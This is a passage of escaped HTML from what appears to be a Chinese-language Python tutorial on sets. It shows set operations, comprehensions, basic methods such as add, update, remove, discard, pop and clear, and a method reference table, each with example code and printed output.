operator\">&amp;</span> b<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># a 和 b 的交集</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">^</span> b<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># a 和 b 中不同时存在的元素</span>\n\n<span class=\"token triple-quoted-string string\">'''\n{1, '123', 'test'}\ntest 在集合中\n{'a', 'b', 'r', 'c', 'd'}\n{'b', 'd', 'r'}\n{'a', 'm', 'r', 'b', 'c', 'd', 'l', 'z'}\n{'c', 'a'}\n{'d', 'l', 'r', 'm', 'z', 'b'}\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>推导式</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>x <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token string\">'abracadabra'</span> <span class=\"token keyword\">if</span> x <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> <span class=\"token string\">'abc'</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># {'r', 'd'}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"基本操作\"><a href=\"#基本操作\" class=\"headerlink\" title=\"基本操作\"></a>基本操作</h3><h4 id=\"添加元素\"><a href=\"#添加元素\" class=\"headerlink\" title=\"添加元素\"></a>添加元素</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> x <span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">thisset <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Taobao\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>thisset<span class=\"token punctuation\">)</span>\nthisset<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>thisset<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n{'Taobao', 'Google', 'Runoob'}\n{'Taobao', 'test', 'Google', 'Runoob'}\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>s.update( x )参数可以是列表，元组，字典</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">s<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> x <span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">thisset <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Taobao\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nthisset<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>thisset<span class=\"token punctuation\">)</span>\nthisset<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>thisset<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n{1, 3, 'Google', 'Taobao', 'Runoob'}\n{1, 3, 4, 'Google', 5, 6, 'Taobao', 'Runoob'}\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"移除元素\"><a href=\"#移除元素\" class=\"headerlink\" title=\"移除元素\"></a>移除元素</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">s<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span> x <span class=\"token punctuation\">)</span>\n\nthisset <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Taobao\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>thisset<span class=\"token punctuation\">)</span>\nthisset<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token string\">\"Taobao\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>thisset<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n{'Google', 'Taobao', 'Runoob'}\n{'Google', 'Runoob'}\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">s<span class=\"token punctuation\">.</span>discard<span class=\"token punctuation\">(</span> x <span class=\"token punctuation\">)</span>\n\nthisset <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Taobao\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>thisset<span class=\"token punctuation\">)</span>\nthisset<span class=\"token punctuation\">.</span>discard<span class=\"token punctuation\">(</span><span class=\"token string\">\"Facebook\"</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 不存在不会发生错误</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>thisset<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n{'Google', 'Taobao', 'Runoob'}\n{'Google', 'Taobao', 'Runoob'}\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>设置随机删除集合中的一个元素</p>\n<p>pop 方法会对集合进行无序的排列</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">s<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> \n\nthisset <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Taobao\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Facebook\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nx <span class=\"token operator\">=</span> thisset<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\nFacebook\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"计算集合元素个数\"><a href=\"#计算集合元素个数\" class=\"headerlink\" title=\"计算集合元素个数\"></a>计算集合元素个数</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n\nthisset <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Taobao\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>thisset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 3</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"清空集合\"><a href=\"#清空集合\" class=\"headerlink\" title=\"清空集合\"></a>清空集合</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">s<span class=\"token punctuation\">.</span>clear<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nthisset <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Taobao\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nthisset<span class=\"token punctuation\">.</span>clear<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>thisset<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># set()</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"判断元素是否在集合中存在\"><a href=\"#判断元素是否在集合中存在\" class=\"headerlink\" title=\"判断元素是否在集合中存在\"></a>判断元素是否在集合中存在</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">x <span class=\"token keyword\">in</span> s\n\nthisset <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Taobao\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Runoob\"</span> <span class=\"token keyword\">in</span> thisset<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Facebook\"</span> <span class=\"token keyword\">in</span> thisset<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\nTrue\nFalse\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>判断元素 x 是否在集合 s 中，存在返回 True，不存在返回 False</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">方法</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-add.html\">add()</a></td>\n<td align=\"left\">为集合添加元素</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-clear.html\">clear()</a></td>\n<td align=\"left\">移除集合中的所有元素</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-copy.html\">copy()</a></td>\n<td align=\"left\">拷贝一个集合</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-difference.html\">difference()</a></td>\n<td align=\"left\">返回多个集合的差集</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-difference_update.html\">difference_update()</a></td>\n<td align=\"left\">移除集合中的元素，该元素在指定的集合也存在。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-discard.html\">discard()</a></td>\n<td align=\"left\">删除集合中指定的元素</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-intersection.html\">intersection()</a></td>\n<td align=\"left\">返回集合的交集</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-intersection_update.html\">intersection_update()</a></td>\n<td align=\"left\">返回集合的交集。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-isdisjoint.html\">isdisjoint()</a></td>\n<td align=\"left\">判断两个集合是否包含相同的元素，如果没有返回 True，否则返回 False。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-issubset.html\">issubset()</a></td>\n<td align=\"left\">判断指定集合是否为该方法参数集合的子集。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-issuperset.html\">issuperset()</a></td>\n<td align=\"left\">判断该方法的参数集合是否为指定集合的子集</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-pop.html\">pop()</a></td>\n<td align=\"left\">随机移除元素</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-remove.html\">remove()</a></td>\n<td align=\"left\">移除指定元素</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-symmetric_difference.html\">symmetric_difference()</a></td>\n<td align=\"left\">返回两个集合中不重复的元素集合。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-symmetric_difference_update.html\">symmetric_difference_update()</a></td>\n<td align=\"left\">移除当前集合中在另外一个指定集合相同的元素，并将另外一个指定集合中不同的元素插入到当前集合中。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-union.html\">union()</a></td>\n<td align=\"left\">返回两个集合的并集</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/ref-set-update.html\">update()</a></td>\n<td align=\"left\">给集合添加元素</td>\n</tr>\n</tbody></table>\n<h3 id=\"函数示例-4\"><a href=\"#函数示例-4\" class=\"headerlink\" title=\"函数示例\"></a>函数示例</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">fruits <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\nfruits<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span><span class=\"token string\">\"orange\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fruits<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'apple', 'cherry', 'banana', 'orange'}</span>\n\nfruits <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\nfruits<span class=\"token punctuation\">.</span>clear<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fruits<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># set()</span>\n\nfruits <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\nx <span class=\"token operator\">=</span> fruits<span class=\"token punctuation\">.</span>copy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'apple', 'cherry', 'banana'}</span>\n\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\ny <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"microsoft\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">}</span>\nz <span class=\"token operator\">=</span> x<span class=\"token punctuation\">.</span>difference<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'cherry', 'banana'}</span>\n\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\ny <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"microsoft\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">}</span>\nx<span class=\"token punctuation\">.</span>difference_update<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'cherry', 'banana'}</span>\n\nfruits <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\nfruits<span class=\"token punctuation\">.</span>discard<span class=\"token punctuation\">(</span><span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fruits<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'apple', 'cherry'}</span>\n\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\ny <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">}</span>\nz <span class=\"token operator\">=</span> x<span class=\"token punctuation\">.</span>intersection<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'apple'}</span>\n\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>  <span class=\"token comment\"># y 集合不包含 banana 和 cherry，被移除</span>\ny <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">}</span>\nx<span class=\"token punctuation\">.</span>intersection_update<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'apple'}</span>\n\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\ny <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"facebook\"</span><span class=\"token punctuation\">}</span>\nz <span class=\"token operator\">=</span> x<span class=\"token punctuation\">.</span>isdisjoint<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\n\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"b\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"c\"</span><span class=\"token punctuation\">}</span>\ny <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"f\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"e\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"d\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"b\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">}</span>\nz <span class=\"token operator\">=</span> x<span class=\"token punctuation\">.</span>issubset<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\n\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"f\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"e\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"d\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"b\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">}</span>\ny <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"b\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"c\"</span><span class=\"token punctuation\">}</span>\nz <span class=\"token operator\">=</span> x<span class=\"token punctuation\">.</span>issuperset<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\n\nfruits <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\nfruits<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fruits<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'cherry', 'banana'}</span>\n\nfruits <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\nfruits<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fruits<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'apple', 'cherry'}</span>\n\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\ny <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">}</span>\nz <span class=\"token operator\">=</span> x<span class=\"token punctuation\">.</span>symmetric_difference<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'cherry', 'runoob', 'banana', 'google'}</span>\n\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\ny <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">}</span>\nx<span class=\"token punctuation\">.</span>symmetric_difference_update<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'cherry', 'runoob', 'banana', 'google'}</span>\n\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\ny <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">}</span>\nz <span class=\"token operator\">=</span> x<span class=\"token punctuation\">.</span>union<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'apple', 'cherry', 'banana', 'google', 'runoob'}</span>\n\nx <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"banana\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"cherry\"</span><span class=\"token punctuation\">}</span>\ny <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"apple\"</span><span class=\"token punctuation\">}</span>\nx<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># {'apple', 'cherry', 'banana', 'google', 'runoob'}</span>\n\n<span class=\"token triple-quoted-string string\">'''\n{'orange', 'apple', 'cherry', 'banana'}\nset()\n{'apple', 'cherry', 'banana'}\n{'cherry', 'banana'}\n{'cherry', 'banana'}\n{'apple', 'cherry'}\n{'apple'}\n{'apple'}\nTrue\nTrue\nTrue\n{'cherry', 'banana'}\n{'apple', 